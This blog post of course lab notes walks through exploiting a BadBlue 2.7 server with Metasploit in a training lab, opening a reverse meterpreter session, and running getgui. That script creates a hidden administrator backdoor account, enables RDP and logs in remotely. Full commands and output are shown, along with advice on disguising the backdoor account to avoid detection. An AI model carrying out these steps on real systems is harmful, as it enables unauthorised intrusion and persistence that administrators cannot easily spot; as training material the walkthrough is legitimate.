---
layout: post
title: "Persistence Service"
date: "2023-07-05"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Persistence（Windows持久化）
## Persistence Via RDP（通过RDP实现持久化）
## Demo: Persistence Via RDP（演示：通过RDP实现持久化）
We're going to be exploring the process of establishing persistent access on a Windows target system by creating a backdoor user account, after which we will also be adding that backdoor user account to the local administrators group so that that user has administrative privileges and in addition to that, we'll be also exploring the process of how to enable RDP or remote desktop protocol on the Windows target system and how to use that RDP access to authenticate with the target system through the backdoor user that we will be creating.

We're going to be gaining access to the target system, after which we'll be exploring how to create the backdoor user account, how to add it to the local administrators group, how to enable RDP, and how to access the target system via RDP. This requires elevated privileges by default or in order to be done.

Target IP Address : 10.2.18.93

```
nmap -sV 10.2.18.93
```

```
searchsploit BadBlue
```

```
msfconsole
search BadBlue
use exploit/windows/http/badblue_passthru
set RHOSTS 10.2.18.93
```

The default payload is the 32-bit meterpreter payload. 

```
show options
exploit
```

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

We don't need to elevate our privileges as we've gained access as the administrator user account.

```
meterpreter > sysinfo
Architecture : x64
Meterpreter : x86/windows
```

I'm going to locate the explorer process, because I want to migrate to a stable process as this particular technique, or this set of commands that we will be running requires a stable meterpreter session.

```
meterpreter > pgrep explorer
4072
```

I'll migrate to that process.

```
meterpreter > migrate 4072
```

This should provide us withh a 64-bit meterpreter session.

```
meterpreter > sysinfo
Architecture : x64
Meterpreter : x64/windows
```

What we're going to be doing firstly, is we are going to be creating a new backdoor user account. And we have the permissions or the privileges to do so. As we are currently the administrator. We're then going to enable the RDP service, if it's disabled. We're then also going to hide the user from the Windows login screen, because one of the issues with Windows is when you create a new user account, and the system is restarted, then on the login page, it will usually display all the user accounts that are available on that system. So this will also be hiding the user from the Windows login screen. And we'll also be adding the user to the administrator group, as well as the remote desktop group on Windows, which is used to allow specific user accounts to log in via RDP. We can do this through the use of a couple of Metasploit Framework modules. However, this can be simplified into one command.

`-e`: execute

`-u`: we want to create a new user. 

It'll run the `getgui` command. The `getgui` command is specifically used to check whether the RDP service is enabled. And if it is disabled, it will enable it. Furthermore, it will also create a new user for us. And we can specify the username and password. It'll also hide the user from the Windows login screen. And it'll add the user to the remote desktop users group, as well as the local administrators group. So that means that we can access the target system via RDP, as well as have administrative privileges once we log on.

```
meterpreter > run getgui -e -u alexis -p hacker_123321
```

[ENABLING REMOTE DESKTOP](https://www.offsec.com/metasploit-unleashed/enabling-remote-desktop/)

这个命令是在Meterpreter会话下执行的，它将运行getgui模块并提供了一些参数。该命令的作用是在目标系统上创建一个具有GUI界面的远程桌面连接，以便后续的操作。具体来说，命令参数的含义如下：

- -e：使用已经存在的RDP会话。
- -u：指定要使用的用户名，这里是alexis。
- -p：指定要使用的密码，这里是hacker_123321。

执行该命令后，如果一切正常，将会在目标系统上创建一个远程桌面连接，并且您可以使用指定的用户名和密码进行登录。这将允许您在目标系统上执行更多的操作。

It's going to open the RDP port in the local firewall if necessary. So that if Windows firewall is active, then it will add the firewall rule pertinent to port 3389. That is the RDP port.

we have established persistent access to the target system, all be it through a Meterpreter session.

```
meterpreter > exit
exit
```

In order to access the target system, we can utilize an RDP client connect to the target. 

```
xfreerdp /u:alexis /p:hacker_123321 /v:10.2.18.93
```

该命令是一个远程桌面连接命令，执行的操作是连接到 IP 地址为 10.2.18.93 的计算机。/u:alexis 参数指定了用户名为 alexis，/p:hacker_123321 参数指定了密码为 hacker_123321。

We're set up a backdoor user that we can use whenever we want to gain access to the target system without exploiting the vulnerability that we used initially to gain access to the target system. And this is something much better primarily because when you create a user account, it's easily identifiable. And you can obtain access to the target system whenever you want through legitimate authentication, as opposed to utilizing exploits, which can be quite disadvantageous, as the vulnerable software that's running on the target system could be patched. And because this is a backdoor user, it's going to be hidden from standard users. However, if an administrator comes on board and sees there's a user account, which they'll be able to do, then that might be an issue. 

Open up the command prompt

```
cmd
```

Run as administrator

```
whoami
whoami /priv
```

We have all the privileges you typically associate with a user account that is a member of the local administrators group.

```
net user
```

This is typically how an administrator would be able to identify that there is another user account that looks suspicious. So if you're going to create a backdoor user, I do recommend that you try and make it blend in with the rest of them. So you could create a guest account, and give it a slightly different syntax. So you can call it guest with a lower case G, just to make sure that you aren't detected.

That is how to create a backdoor user, how to enable the RDP service, how to hide the backdoor user account from the Windows logon screen. And how to authenticate with the target system via RDP.

# Maintaining Access: RDP 维护访问：RDP 
## Overview  概述 
A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

为您提供了一台 Kali GUI 机器和一台运行易受攻击服务器的目标机器。目标计算机的 IP 地址在名为 target 的文本文件中提供，该文件放置在 Kali 机器的桌面 （/root/Desktop/target） 上。

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

您的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，并使用适当的 Metasploit 模块利用应用程序。

Then use RDP (Remote Desktop Protocol) for maintaining access on the target machine.

然后使用 RDP（远程桌面协议）维护目标计算机上的访问权限。

Objective: Exploit the application and maintain access using RDP.

目标：利用应用程序并使用RDP保持访问权限。

Instructions:  指示： 

Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.

您的 Kali 机器有一个 IP 地址为 10.10.X.Y. 的接口。 运行“ip addr”以了解 X 和 Y 的值。

The IP address of the target machine is mentioned in the file “/root/Desktop/target”

目标计算机的 IP 地址在文件“/root/Desktop/target”中提及

Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

不要攻击位于 IP 地址 192.V.W.1 和 10.10.X.1 的网关

## Solutions  解决方案 
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-2142.pdf

本实验的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2142.pdf

## 复现视频内容
Target IP Address : 10.0.26.194

Kali Linux : 10.10.16.2

```
root@attackdefense:~# nmap -sV 10.0.26.194
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-05 14:01 IST
Nmap scan report for 10.0.26.194
Host is up (0.0027s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          BadBlue httpd 2.7
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
```

```
root@attackdefense:~# searchsploit BadBlue 2.7
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
BadBlue 2.72 - PassThru Remote Buffer Overflow                                                                                                              | windows/remote/4784.pl
BadBlue 2.72b - Multiple Vulnerabilities                                                                                                                    | windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)                                                                                                       | windows/remote/16806.rb
Working Resources BadBlue 1.2.7 - Denial of Service                                                                                                         | windows/dos/20641.txt
Working Resources BadBlue 1.2.7 - Full Path Disclosure                                                                                                      | windows/remote/20640.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```
root@attackdefense:~# msfconsole -q
msf6 > search BadBlue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.26.194
RHOSTS => 10.0.26.194
msf6 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.0.26.194
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.26.194:49758) at 2023-07-05 14:06:14 +0530

meterpreter > 
```

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > pgrep explorer
4076
meterpreter > migrate 4076
[*] Migrating from 4820 to 4076...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

```
meterpreter > run getgui -e -u alexis -p hacker_123321

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*] 	RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: alexis with Password: hacker_123321
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: alexis to local group 'Remote Desktop Users'
[*] 	Adding User: alexis to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20230705.1402.rc
```

```
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/badblue_passthru) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                  Connection
  --  ----  ----                     -----------                                  ----------
  1         meterpreter x64/windows  ATTACKDEFENSE\Administrator @ ATTACKDEFENSE  10.10.16.2:4444 -> 10.0.26.194:49758 (10.0.26.194)

msf6 exploit(windows/http/badblue_passthru) > exit -y
root@attackdefense:~# 
```

```
root@attackdefense:~# xfreerdp /u:alexis /p:hacker_123321 /v:10.0.26.194
```

```
C:\Users\alexis>whoami
attackdefense\alexis

C:\Users\alexis>net user

User accounts for \\ATTACKDEFENSE

-------------------------------------------------------------------------------
Administrator            alexis                   DefaultAccount
Guest                    student                  WDAGUtilityAccount
The command completed successfully.

C:\Users\alexis>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\alexis>
```

Run as Administrator

```
C:\Windows\system32>whoami
attackdefense\alexis

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

C:\Windows\system32>net user

User accounts for \\ATTACKDEFENSE

-------------------------------------------------------------------------------
Administrator            alexis                   DefaultAccount
Guest                    student                  WDAGUtilityAccount
The command completed successfully.


C:\Windows\system32>net group administrators
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.
```